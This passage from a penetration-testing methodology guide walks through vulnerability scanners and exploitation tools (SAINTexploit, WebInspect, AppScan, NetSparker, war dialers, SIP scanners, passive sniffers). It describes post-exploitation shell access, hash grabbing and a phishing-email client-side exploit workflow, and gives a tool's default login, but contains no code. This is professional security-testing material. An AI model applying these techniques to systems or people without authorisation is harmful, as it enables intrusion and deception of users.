Penetration Testing (SAINTXploit) tab easily available and visible. It
is possible to login remotely to SAINT, by default this is over port
1414 and has those hosts allowed to connect have to be setup via
Options, startup options, Category remote mode, subcategory host
options: Screenshot Here SAINT_Remote_host.png refers (included).
Configuration of scanning options should now be performed which is
accessed by Options, scanning options, Category scanning policy. Each
sub category needs to be addressed to ensure that the correct default
scanning parameters are set i.e. using nmap rather than the in-built
SAINT port scanner and which ports to probe, that dangerous checks are
disabled (if required) and that the required items for compliance and
audit are enabled for reporting i.e. anti-virus, age of definition check
etc. Screenshot Here SAINT_scanning_options.png refers (included).
Note: - The target restrictions sub-category should be amended if any
hosts are not to be probed. The most import scanning option is Category
Scanning policy, sub-category probe options, option, what scanning
policy should be used, the scan required is selected or a custom policy
built-up to suit the actual task Screenshot here
SAINT_policy_setup.png refers (included). Having configured all the
options required the actual process of carrying out a scan can be
addressed. Step 1 Insert IP Range/ Address or Upload Target List Step 2
Type in credentials Screenshot here SAINT_scansetup1.png refers
(included). Step 3 Select Scan Policy Type Step 4 Determine Firewall
settings for Target Step 5 Select Scan Now Screenshot here
SAINT_scansetup2.png refers (included).</p>
<p>SAINTexploit</p>
<p>Different levels of penetration tests can be carried out:</p>
<p>Discovery - Identify hosts. Information Gathering - Identify hosts,
probe and port scan. Single Penetration - Both above then exploits
stopping at first successful exploit. Root Penetration - Exploit then
Privilege escalation to admin/ root. Full Penetration - Exploits as many
vulnerabilities as possible. Web Application - Attacks discovered web
applications.</p>
<p>Conducting a test is fairly straight forward, once any prior
configuration has been carried out, callback ports, timeouts etc. Just
select the Pen Test icon then go through the following 4 steps. Once
complete select run pen test now.</p>
<p>Step 1 Insert IP Range/ Address or Upload Target List Step 2 Type in
credentials</p>
<p>Screenshot here SAINT_pen1.png refers (included).</p>
<p>Step 3 Select Penetration Test Type Step 4 Determine Firewall settings
for Target</p>
<p>SAINT_pen2.png Screenshot here SAINT_pen2.png refers (included).</p>
<p>Once a host has been successfully exploited, navigating to the
connections tab provides the ability to directly interact with the
session. SAINTexploit provides four useful tools in this tab to allow
interactive access to the session and a disconnect button to close any
outstanding connection:</p>
<p>Command Prompt. File and Upload Manager. Screenshot Taker Tunnel.</p>
<p>Screenshot here SAINT_connections.png refers (included) The File
Manager gives the ability to perform numerous actions. This is opened
via the connections tab, providing the ability to upload/ download/
rename files. Screenshot here SAINT_filemgr.png refers (included) A
Command Prompt can be utilised on an exploited host, the tool is opened
via the connections tab, all DOS/Bash type commands that are applicable
to the target OS can be ran. Screenshot here SAINT_cmd.png refers
(included) The Screenshot Tool can be used against an exploited host to
grab a screenshot for the report. Screenshot here SAINT_screen.png
refers (included) Varied other tools that can be utilised against the
host, i.e. grabbing password hashes and many others can be accessed and
executed via the exploits icon, tools option.</p>
<p>Custom Client Side attacks These can be performed by using the exploits
icon, selecting exploits, expanding out the client list and clicking on
the appropriate exploit that you wish to utilise against the client (run
now) Screenshot here SAINT_client1.png refers (included) Select, port
the client is to connect to, the shell port and the target type.
Annotate any specific mail from and to parameters Screenshot here
SAINT_client2.png refers (included) Type in the subject, either select
a predefined template and alter the message to suit Screenshot here
SAINT_client3.png refers (included) A sample pre-defined template is
available which looks very realistic Screenshot here SAINT_client4.png
refers (included) Selecting run now will start the exploit server
against the specified target host Screenshot here SAINT_client5.png
refers (included) If a client click the link in the email they have just
been sent, and they are exploitable, the host will appear in the
connections tab and can then be interacted with as above.</p>
<p>SAINTwriter</p>
<p>SAINTwriter is a component of SAINT that allows you to generate a
variety of customised reports. SAINTwriter features eight pre-configured
reports, eight report formats (HTML, Frameless HTML, Simple HTML, PDF,
XML, text, tab-separated text, and comma-separated text), and over 100
configuration options for custom reports.</p>
<p>To generate a report</p>
<p>Step 1 From the SAINT GUI, go to Data, and from there go to SAINTwriter.
Step 2 Read the descriptions of the pre-configured reports and select
the one which best suits your needs. Screenshot here SAINT_writer.png
refers (included). A sample report is available here and here
SAINT_report1.pdf and SAINT_report2.pdf refer (included)</p>
</div>
</div>
<div class="section" id="web-application-scanners">
<h4>Web Application Scanners<a class="headerlink" href="#web-application-scanners" title="Permalink to this headline">¶</a></h4>
<div class="section" id="general-web-application-scanners">
<h5>General Web Application Scanners<a class="headerlink" href="#general-web-application-scanners" title="Permalink to this headline">¶</a></h5>
<p>WebInspect (Windows)</p>
<p>HP&#8217;s WebInspect application security assessment tool helps identify
known and unknown vulnerabilities within the Web application layer.
WebInspect can also help check that a Web server is configured properly,
and attempts common web attacks such as parameter injection, cross-site
scripting, directory traversal, and more</p>
<p>When you first start WebInspect, the application displays the Start
Page. For this page we can perform the five major functions within the
WebInpsect GUI. The options are to start a Web Site Assessment, start a
Web Service Assessment, start an Enterprise Assessment, generate a
Report, and start Smart Update. From the Start Page, you can also access
recently opened scans, view the scans that are scheduled for today and
finally, view the WebInspect Messages.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_99.png">Screenshot Here</a> &#8216;&#8217;&#8216;</p>
<p>The first scan that is performed with WebInspect is the Web Site
Assessment Scan. WebInspect makes use of the New Web Site Assessment
Wizard to setup the assessment scans.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_100.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>When you start the New Scan wizard, the Scan Wizard window appears. The
options displayed within the wizard windows are extracted from the
WebInspect default settings. The important thing to note is that any
changes you make will be used for this scan only.</p>
<p>In the Scan Name box, enter a name or a brief description of the scan.
Next you need to select one an assessment mode. The options available
are Crawl Only, Crawl and Audit, Audit Only, and Manual. The &#8220;Crawl
Only&#8221; option completely maps a site&#8217;s tree structure. It is possible
after a crawl has been completed, to click &#8220;Audit&#8221; to assess an
application&#8217;s vulnerabilities. &#8220;Crawl and Audit&#8221; maps the site&#8217;s
hierarchical data structure, and audits each page as it is discovered.
This should be used when assessing extremely large sites. &#8220;Audit Only&#8221;
determines vulnerabilities, but does not crawl the web site. The site is
not assessed when this option is chosen. Finally, &#8220;Manual&#8221; mode allows
you to navigate manually to sections of the application. It does not
crawl the entire site, but records information only about those
resources that you encounter while scanning a Site manually navigating
the site. Use this option if there are credentialed scans being
performed. Also, ensure that you embed the credentials in the profile
settings.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_101.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>It is recommended to crawl the client site first. This allows the
opportunity to identify any forms that need to be filtered during the
audit as well as identify directories/file names (in some cases, even
the profiler) that need to be ignored for a scan to complete.</p>
<p>Once you have selected the assessment mode, you will need to select the
assessment type. There are four options available, Standard Assessment,
List-Driven Assessment, Manual Assessment, and Workflow-Driven
Assessment. The Standard Assessment type consists of automated analysis,
starting from the target URL. This is the normal way to start a scan.
Manual Assessment allows you to navigate manually to</p>
<p>whatever sections of your application you choose to visit, using
Internet Explorer. List-Driven Assessment performs an assessment using a
list of URLs to be scanned. Each URL must be fully qualified and must
include the protocol (for example, <a class="reference external" href="http://">http://</a> or <a class="reference external" href="https://">https://</a>). Workflow-Driven
Assessment: WebInspect audits only those URLs included in the macro that
you previously recorded and does not follow any hyperlinks encountered
during the audit.</p>
<p>As discussed earlier, Standard Assessment will normally be used for the
initial scans. If this is the choice you&#8217;ve selected you will need to
type or select the complete URL or IP address of the client&#8217;s site to be
examined. When you enter a URL, it must be precise. For example, if you
entering client.com will not result in a scan of www.client.com or any
other variations. To scan from a specific point append a starting point
for the scan, such as <a class="reference external" href="http://www.client.com/clientapplication/">http://www.client.com/clientapplication/</a>. By
default, scans performed by IP address will not follow links that use
fully qualified URLs.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_102.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>Select &#8220;Restrict to folder&#8221; to limit the scope of the assessment to the
area selected. There are three options available from the drop-down
list.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_103.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>The choices are Directory only, Directory and subdirectories, and
Directory and parent directories. Choosing the &#8220;Directory only&#8221; option
will force a crawl and/or audit only for the URL specified. The
&#8220;Directory and subdirectories&#8221; options will crawl and/or audit at the
URL specified as well as subordinate directories. It will not access any
directory than the URL specified. The &#8220;Directory and parent directories&#8221;
option will crawl and/or audit the URL you specified, but will not
access any subordinate directories.</p>
<p>Once you have selected to appropriate options, click Next to continue.</p>
<p>If the target site needs to accessed through a proxy server, select
Network Proxy and then choose an option from the Proxy Profile list. The
default is to Use Internet Explorer. The other options available are
Autodetect, Use PAC File, Use Explicit Proxy Settings, and Use Mozilla
Firefox. Autodetect uses the Web Proxy Autodiscovery Protocol (WPAD) to
locate a proxy autoconfig file and use this to configure the browser&#8217;s
Web proxy settings. Use PAC File loads proxy settings from a Proxy
Automatic Configuration (PAC) file. Use Explicit Proxy Settings allows
you to specify proxy server settings. Use Mozilla Firefox imports the
proxy server information from Firefox.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_104.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>Selecting to use browser proxy settings does not guarantee that you will
be able to access the Internet through a particular proxy server. If the
Internet Explorer settings are configured to use a proxy that is not
running, then you will not be able to access the site to begin the
assessment. For this reason, it is always recommended to check the prosy
settings of the application you have selected.</p>
<p>Select Network Authentication if server authentication is required. Then
choose the specific authentication method and enter your network
credentials. Click Next to continue.</p>
<p>The Coverage and Thoroughness options are not usually modified, unless
you are targeting an Oracle site.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_105.png">Screenshot Here</a></p>
<p>To optimize settings for an Oracle site, select Framework and then
choose the site type from the Optimize scan for list. Use the Crawl
slider to specify the crawler settings.</p>
<p>If enabled, the slider allows you to select one of four crawl positions.
The options are Thorough, Default, Normal, and Quick. The specific
settings are as follows:</p>
<p>Thorough uses the following settings:</p>
<ul class="simple">
<li>Redundant Page Detection: OFF</li>
<li>Maximum Single URL Hits: 20</li>
<li>Maximum Web Form Submissions: 7</li>
<li>Create Script Event Sessions: ON</li>
<li>Maximum Script Events Per Page: 2000</li>
<li>Number of Dynamic Forms Allowed Per Session: Unlimited</li>
<li>Include Parameters In Hit Count: True</li>
</ul>
<p>Default uses the following settings:</p>
<ul class="simple">
<li>Redundant Page Detection: OFF</li>
<li>Maximum Single URL Hits: 5</li>
<li>Maximum Web Form Submissions: 3</li>
<li>Create Script Event Sessions: ON</li>
<li>Maximum Script Events Per Page: 1000</li>
<li>Number of Dynamic Forms Allowed Per Session: Unlimited</li>
<li>Include Parameters In Hit Count: True</li>
</ul>
<p>Normal uses the following settings:</p>
<ul class="simple">
<li>Redundant Page Detection: OFF</li>
<li>Maximum Single URL Hits: 5</li>
<li>Maximum Web Form Submissions: 2</li>
<li>Create Script Event Sessions: ON</li>
<li>Maximum Script Events Per Page: 300</li>
<li>Number of Dynamic Forms Allowed Per Session: 1</li>
<li>Include Parameters In Hit Count: False</li>
</ul>
<p>Quick uses the following settings:</p>
<ul class="simple">
<li>Redundant Page Detection: ON</li>
<li>Maximum Single URL Hits: 3</li>
<li>Maximum Web Form Submissions: 1</li>
<li>Create Script Event Sessions: OFF</li>
<li>Maximum Script Events Per Page: 100</li>
<li>Number of Dynamic Forms Allowed Per Session: 0</li>
<li>Include Parameters In Hit Count: False</li>
</ul>
<p>Select the appropriate crawl position and click Next to continue.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_106.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>Ensure that the select Run Profiler Automatically box is checked. Click
Next to continue.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_107.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>At this point the scan has been properly configured. There is an option
to save the scan settings for later use. Click Scan to exit the wizard
and begin the scan.</p>
<p>As soon as you start a Web Site Assessment, WebInspect displays in the
Navigation pane an icon depicting each session. It also reports possible
vulnerabilities on the Vulnerabilities tab and Information tab in the
Summary pane. If you click a URL listed in the Summary pane, the program
highlights the related session in the Navigation pane and displays its
associated information in the Information pane. The relative severity of
a vulnerability listed in the Navigation pane is identified by its
associated icon.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_108.png">Screenshot Here</a></p>
<div class="line-block">
<div class="line"><br /></div>
<div class="line">When conducting or viewing a scan, the Navigation pane is on the left
side of the WebInspect&#8217;&#8217; &#8216;&#8217;window. It includes the Site, Sequence,
Search, and Step Mode buttons, which determines view presented.</div>
</div>
<p>When conducting or viewing a scan, the Information pane contains three
collapsible information panels and an information display area. Select
the type of information to display by clicking on an item in one of
three information panels in the left column.</p>
<p>The Summary pane has five tabs: Vulnerabilities, Information, Best
Practices, Scan Log, and Server Information. The Vulnerabilities Tab
lists all vulnerabilities discovered during an audit. The Information
Tab lists information discovered during an assessment or crawl. These
are not considered vulnerabilities, but simply identify interesting
points in the site or certain applications or Web servers. The Best
Practices Tab lists issues detected by WebInspect that relate to
commonly accepted best practices for Web development. Items listed here
are not vulnerabilities, but are indicators of overall site quality and
site development security practices (or lack thereof).</p>
<p>The Scan Log Tab is used to view information about the assessment. For
instance, the time at which certain auditing was conducted against the
target. Finally, the Server Information Tab lists items of interest
pertaining to the server.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_109.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>The final step is to export the results further analysis. To export the
results of the analysis to an XML file, click File, then Export. This
presents the option to export the Scan or Scan Details.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_110.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>From the Export Scan Details window we need to choose the Full from the
Details option. This will ensure that we obtain the most comprehensive
report possible. Since this is only available in XML format, the only
option we have left to choose is to scrub data. If you want to ensure
that SSN, and Credit Card data is scrubbed then select these options. If
you choose to scrub IP address information then the exported data will
be useless for our purposes. Click Export to continue. Choose the file
location to save the exported data.</p>
<p><strong>Web Service Assessment Scan</strong></p>
<p>The first scan that is performed with WebInspect is the Web Site
Assessment Scan. WebInspect makes use of the New Web Site Assessment
Wizard to setup the assessment scans.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_111.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>When you start the New wizard, the Web Service Scan Wizard window
appears. The options displayed within the wizard windows are extracted
from the WebInspect default settings. The important thing to note is
that any changes you make will be used for this scan only.</p>
<p>In the Scan Name box, enter a name or a brief description of the scan.
Next you need to select one an assessment mode. The options available
are Crawl Only, and Crawl and Audit. The &#8220;Crawl Only&#8221; option completely
maps a site&#8217;s tree structure. It is possible after a crawl has been
completed, to click &#8220;Audit&#8221; to assess an application&#8217;s vulnerabilities.
&#8220;Crawl and Audit&#8221; maps the site&#8217;s hierarchical data structure, and
audits each page as it is discovered.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_112.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>Once you have selected the assessment mode, you will need to select the
location of the WSDL file. WSDL is an XML format for describing network
services as a set of endpoints operating on messages containing either
document-oriented or procedure-oriented information. Once you have
selected to appropriate options, click Next to continue.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_113.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>At this point the scan has been properly configured. There is an option
to save the scan settings for later use. Click Scan to exit the wizard
and begin the scan.</p>
<p>As soon as you start a Web Service Assessment, WebInspect displays in
the Navigation pane an icon depicting each session. It also reports
possible vulnerabilities on the Vulnerabilities tab and Information tab
in the Summary pane. If you click a URL listed in the Summary pane, the
program highlights the related session in the Navigation pane and
displays its associated information in the Information pane. The
relative severity of a vulnerability listed in the Navigation pane is
identified by its associated icon.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_114.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>When conducting or viewing a scan, the Navigation pane is on the left
side of the WebInspect&#8217;&#8217; &#8216;&#8217;window. It includes the Site, Sequence,
Search, and Step Mode buttons, which determines view presented.</p>
<p>When conducting or viewing a scan, the Information pane contains three
collapsible information panels and an information display area. Select
the type of information to display by clicking on an item in one of
three information panels in the left column.</p>
<p>The Summary pane has five tabs: Vulnerabilities, Information, Best
Practices, Scan Log, and Server Information. The Vulnerabilities Tab
lists all vulnerabilities discovered during an audit. The Information
Tab lists information discovered during an assessment or crawl. These
are not considered vulnerabilities, but simply identify interesting
points in the site or certain applications or Web servers. The Best
Practices Tab lists issues detected by WebInspect that relate to
commonly accepted best practices for Web development. Items listed here
are not vulnerabilities, but are indicators of overall site quality and
site development security practices (or lack thereof).</p>
<p>The Scan Log Tab is used to view information about the assessment. For
instance, the time at which certain auditing was conducted against the
target. Finally, the Server Information Tab lists items of interest
pertaining to the server.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_115.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>The final step is to export the results for further analysis. To export
the results of the analysis to an XML file, click File, then Export.
This presents the option to export the Scan or Scan Details.</p>
<p>&#8216;&#8217;&#8217; <a class="reference external" href=":File:Penetration_Testing_Execution_116.png">Screenshot Here</a>
&#8216;&#8217;&#8216;</p>
<p>From the Export Scan Details window we need to choose the Full from the
Details option. This will ensure that we obtain the most comprehensive
report possible. Since this is only available in XML format, the only
option we have left to choose is to scrub data. If you want to ensure
that SSN, and Credit Card data is scrubbed then select these options. If
you choose to scrub IP address information then the exported data will
be useless for our purposes. Click Export to continue. Choose the file
location to save the exported data.</p>
<p>IBM AppScan</p>
<p>IBM Rational AppScan automates application security testing by scanning
applications, identifying vulnerabilities and generating reports with
recommendations to ease remediation. This tutorial will apply to the
AppScan Standard Edition which is a desktop solution to automate Web
application security testing. It is intended to be use by small security
teams with several security testers.</p>
<p>To ensure APPScan has the latest updates you should click update on the
toolbar menu. This will check the IBM servers for updates. Internet
access is required.</p>
<p>The simplest way to configure a scan is to use the Configuration Wizard.
You can access the Configuration Wizard by clicking “New” on the File
menu. You will be presented with the “New Scan” dialog box. Enable or
disable the “Configuration Wizard” by checking the box.</p>
<p>You can then choose what type of scan you wish to perform. The default
is a Web Application Scan.</p>
<p>You then have to enter the starting URL for the web application. Other
options on that screen include choosing Case-Sensitivity path for
Unix\Linux systems, adding additional servers and domains and enabling
proxy and platform authentication option. Uncheck the case-sensitivity
path option if you know all the systems are windows as it can help
reduce the scan time.</p>
<p>If the web application requires authentication then there are several
options to choose from. Recorded allows you to record the login
procedure so that AppScan can perform the login automatically. Prompt
will prompt with the login screen during the scan when a login is
required. Automatic can be used in web applications that only require a
username and password. An important option is the “I want to configure
In-Session detection options” if anything other they “None” is chosen.
This option automatically detects if the web application is out of
session. AppScan with automatically configure this feature but if it’s
not correct scan results will be unreliable.</p>
<p>Next you will be asked to choose a test policy. There are various
built-in policies and each have various inclusions and exclusions. You
can also create a custom policy.</p>
<p>By default AppScan tests the login and logout pages. This is enabled
with the “Send tests on login and logout pages” option. Some
applications have safeguards that could lockout the test account and
prevent a scan from completing. You need monitor the testing logs to
ensure login is not failing. AppScan also deletes previous session
tokens before testing login pages. You may need to disable this option
if a valid session token is required on the login pages. This can
disabled by unchecking the “Clear session identifiers before testing
login pages” option</p>
<p>You have now completed the scan configuration and will be prompted to
start the scan. By default AppScan will start a full scan of the
application. To ensure full coverage of the application a Manual Explore
of the application is preferred. With this option AppScan with provide
you with a browser window and you can access the application to explore
every option and feature available. Once the full application has been
explored you can close the browser and AppScan will add the discovered
pages its list for testing. You can then start the full scan (Using
ScanFull Scan on the menu bar) and AppScan will automatically scan the
application.</p>
<p>Web Directory Listing/Bruteforcing</p>
<p>DirBuster is a java application that is designed to brute force web
directories and files names. DirBuster attempts to find hidden or
obfuscated directories, but as with any bruteforcing tool, it is only as
good as the directory and file list utilized. For that reason, DirBuster
has 9 different lists.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_117.png">Screenshot Here</a></p>
<p>Webserver Version/Vulnerability Identification</p>
<p>The ability to identify the Webserver version is critical to identify
vulnerabilities specific to a particular installation. This information
should have been gathered as part of an earlier phase.</p>
</div>
<div class="section" id="netsparker-windows">
<h5>NetSparker (Windows)<a class="headerlink" href="#netsparker-windows" title="Permalink to this headline">¶</a></h5>
<p>NetSparker is windows based Web Application Scanner. This scanner tests
for all common types of web application security flaws. This scanner
allows the user to enter NTLM, Forms based and certificate based
credentials. NetSparker boasts its ability to confirm the findings it
presents to the user. NetSparker is an inexpensive Web Application
Scanner.</p>
<p>When launching NetSparker, the user is presented with the following
screen, which has tabs for the Scan Settings, Authentication and
Advanced Settings.</p>
<p>NetSparker allows the user to enter credentials for Forms based
Authentication in the following dialogue.</p>
<p>Once credentials have been entered, NetSparker presents those to the web
application in a mini-browser view as seen below.</p>
<p>The below confirms that NetSparker is able to use the supplied
credentials to login to the application.</p>
<p>In an effort to make sure that NetSparker knows when it has logged
itself out of the web application, the user is able to specify the
logged in and logged out conditions.</p>
<p>The final step of the process confirms the settings are configured
correctly.</p>
<p>NetSparker offers five different methods to start the scan as seen
below. These include Start Scan, Crawl and Wait, Manual Crawl (Proxy
Mode), Scan Imported Links Only and Schedule Scan.</p>
<p>The scan starts with a crawl of the website and classifies the potential
security issues as seen below.</p>
<p>The next phase is attacking the website. This begins to show identified
vulnerabilities as shown in this screenshot.</p>
<p>Each finding can be shown in a Browser View as shown in this screenshot.</p>
<p>The vulnerability can also be displayed in an HTTP Request / Response
format as seen in this screenshot.</p>
<p>To check the status of the scan, click on View and select Dashboard.</p>
<p>Also included is the Vulnerability Chart</p>
<blockquote>
<div>Reporting options include PDF, HTML, CSV and XML formats.</div></blockquote>
</div>
<div class="section" id="specialized-vulnerability-scanners">
<h5>Specialized Vulnerability Scanners<a class="headerlink" href="#specialized-vulnerability-scanners" title="Permalink to this headline">¶</a></h5>
<p>Virtual Private Networking (VPN)</p>
<p>Virtual Private Networking (VPN) involves &#8220;tunneling&#8221; private data
through the Internet. The four most widely known VPN &#8220;standards&#8221; are
Layer 2 Forwarding (L2F), IP Security (IPSec), Point-to-Point Tunneling
Protocol (PPTP), and Layer 2 Tunneling Protocol (L2TP). VPN servers
generally will not be detected by a port scans as they don&#8217;t listen on
TCP ports, so a TCP port scan won&#8217;t find them. In addition, they won&#8217;t
normally send ICMP unreachable messages, so a UDP port scans more than
likely won&#8217;t find them. This is why we need specialized scanners to find
and identify them.</p>
<p><strong>ike-scan</strong></p>
<p>ike-scan is a command-line IPsec VPN scanning, fingerprinting and
testing tool that uses the IKE protocol to discover, fingerprint and
test IPsec VPN servers. Ike-scan sends properly formatted IKE packet to
each of the address you wish to scan and displays the IKE responses that
are received. While ike-scan has a dozens of options, we will only cover
the basics here.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_118.png">Screenshot Here</a></p>
<p>Using ike-scan to actually perform VPN discovery is relatively straight
forward. Simply give it a range and it will attempt to identify</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_119.png">Screenshot Here</a></p>
<p>IPv6</p>
<p>The THC-IPV6 Attack Toolkit is a complete set of tools to scan for
inherent protocol weaknesses of IPv6 deployments. Implementation6 which
performs various implementation checks on IPv6.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_120.png">Screenshot Here</a></p>
<p>Exploit6 is another tool from the THC-IPV6 Attack Toolkit which can test
for known ipv6 vulnerabilities.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_121.png">Screenshot Here</a></p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_122.png">Screenshot Here</a></p>
<p>War Dialing</p>
<p>War dialing is process of using a modem to automatically scan a list of
telephone numbers, usually dialing every number in a local area code to
search for computers, Bulletin board systems and fax machines.</p>
<p><strong>WarVOX</strong></p>
<p>WarVOX is a suite of tools for exploring, classifying, and auditing
telephone systems. Unlike normal wardialing tools, WarVOX works with the
actual audio from each call and does not use a modem directly. This
model allows WarVOX to find and classify a wide range of interesting
lines, including modems, faxes, voice mail boxes, PBXs, loops, dial
tones, IVRs, and forwarders. WarVOX provides the unique ability to
classify all telephone lines in a given range, not just those connected
to modems, allowing for a comprehensive audit of a telephone system.
VoIP</p>
<p>VoIP networks rely on the network infrastructure that just simply
targeting phones and servers is like leaving half the scope untouched.
The intelligence gathering phase should have resulted in identify all
network devices, including routers and VPN gateways, web servers, TFTP
servers, DNS servers, DHCP servers, RADIUS servers, and firewalls. Note:
The default username is admin with a password of warvox.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_122.png">Screenshot Here</a></p>
<p><strong>iWar</strong></p>
<p>iWar is a War dialer written for Linux, FreeBSD, OpenBSD, etc.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_123.png">Screenshot Here</a></p>
<p><strong>Plain Analog Wardialer (PAW) / Python Advanced Wardialing System
(PAWS)</strong></p>
<p>PAW / PAWS is a wardialing software in python. It is designed to scan
for ISDN (PAWS only) and newer analog modems.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_124.png">Screenshot Here</a></p>
<p><strong>SIPSCAN</strong></p>
<p>SIPSCAN uses REGISTER, OPTIONS and INVITE request methods to scan for
live SIP extensions and users. SIPSCAN comes with a list of usernames
(users.txt) to brute force. This should be modified to include data
collected during earlier phases to target the specific environment.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_125.png">Screenshot Here</a></p>
<p><strong>SIPSAK</strong></p>
<p>SIPSAK is tool that can test for SIP enabled applications and devices
using the OPTION request method only.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_126.png">Screenshot Here</a></p>
<p><strong>SVMAP</strong></p>
<p>SVMAP is a part of the SIPVicious suite and it can be used to scan
identify and fingerprint a single IP or a range of IP addresses. Svmap
allows specifying the method being used such as OPTIONS, INVITE, and
REGISTER.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_127.png">Screenshot Here</a></p>
</div>
</div>
<div class="section" id="passive-testing">
<h4>Passive Testing<a class="headerlink" href="#passive-testing" title="Permalink to this headline">¶</a></h4>
<p>Passive Testing is exactly what it sounds like. Testing for
vulnerabilities but doing so in a passive manner. This is often best
left to automated tools, but it can be accomplished by manually methods
as well.</p>
<div class="section" id="id9">
<h5>Automated Tools<a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h5>
<p>Traffic Monitoring</p>
<p>Traffic Monitoring is a passive mechanism for gathering further
information about the targets. This can be helpful in determining the
specifics of an operating system or network device. There are times when
active fingerprinting may indicate, for example, an older operating
system. This may or may not be the case. Passive fingerprinting is
essentially a &#8220;free&#8221; way to ensure that the data you are reporting is as
accurate as possible.</p>
<p><strong>P0f</strong></p>
<p>P0f is an awesome passive fingerprinting tool. P0f can identify the
operating system on based upon machines you connect to and that you
connect to as well as machines that you cannot connect to. Also, it can
fingerprint machines based upon the communications that your interfaces
can observe.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_128.png">Screenshot Here</a></p>
</div>
<div class="section" id="wireshark">
<h5>Wireshark<a class="headerlink" href="#wireshark" title="Permalink to this headline">¶</a></h5>
<p>Wireshark is a free and open-source packet analyzer. It is used for
network troubleshooting, analysis, software and communications protocol
development, and education. Originally named Ethereal, in May 2006 the
project was renamed Wireshark due to trademark issues.</p>
<p>Wireshark is cross-platform, using the GTK+ widget toolkit to implement
its user interface, and using pcap to capture packets; it runs on
various Unix-like operating systems including Linux, Mac OS X, BSD, and
Solaris, and on Microsoft Windows.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_129.png">Screenshot Here</a></p>
</div>
<div class="section" id="tcpdump">
<h5>Tcpdump<a class="headerlink" href="#tcpdump" title="Permalink to this headline">¶</a></h5>
<p>Tcpdump is a common packet analyzer that runs under the command line. It
allows the user to intercept and display TCP/IP and other packets being
transmitted or received over a network to which the computer is
attached. Tcpdump works on most Unix-like operating systems: Linux,
Solaris, BSD, Mac OS X, HP-UX and AIX among others. In those systems,
tcpdump uses the libpcap library to capture packets.</p>
<p>There is also a port of tcpdump for Windows called WinDump; this uses
WinPcap, which is a port of libpcap to Windows.</p>
<p><a class="reference external" href=":File:Penetration_Testing_Execution_130.png">Screenshot Here</a></p>
</div>
<div class="section" id="metasploit-scanners">
<h5>Metasploit Scanners<a class="headerlink" href="#metasploit-scanners" title="Permalink to this headline">¶</a></h5>
<p>Metasploit Unleashed</p>
<p>The <a class="reference external" href="http://www.offensive-security.com/metasploit-unleashed/Vulnerability_Scanning">Metasploit
Unleashed</a>
course has several tutorials on performing vulnerability scanning
leveraging the Metasploit Framework.</p>
</div>
</div>
</div>
<div class="section" id="vulnerability-validation">
<h3>Vulnerability Validation<a class="headerlink" href="#vulnerability-validation" title="Permalink to this headline">¶</a></h3>
<div class="section" id="public-research">
<h4>Public Research<a class="headerlink" href="#public-research" title="Permalink to this headline">¶</a></h4>
<p>A product of the vast amount of security research is the discovery of
vulnerabilities and associated Proof of Concept (PoC) and/or exploit
code. The results from the vulnerability identification phase must be
individually validated and where exploits are available, these must be
validated. The only exception would be an exploit that results in a
Denial of Service (DoS). This would need to be included in the scope to
be considered for validation. There are numerous sites that offer such
code for download that should be used as part of the Vulnerability
Analysis phase.</p>
<ul class="simple">
<li>Exploit-db - <a class="reference external" href="http://www.exploit-db.com">http://www.exploit-db.com</a></li>
<li>Security Focus - <a class="reference external" href="http://www.securityfocus.com">http://www.securityfocus.com</a></li>
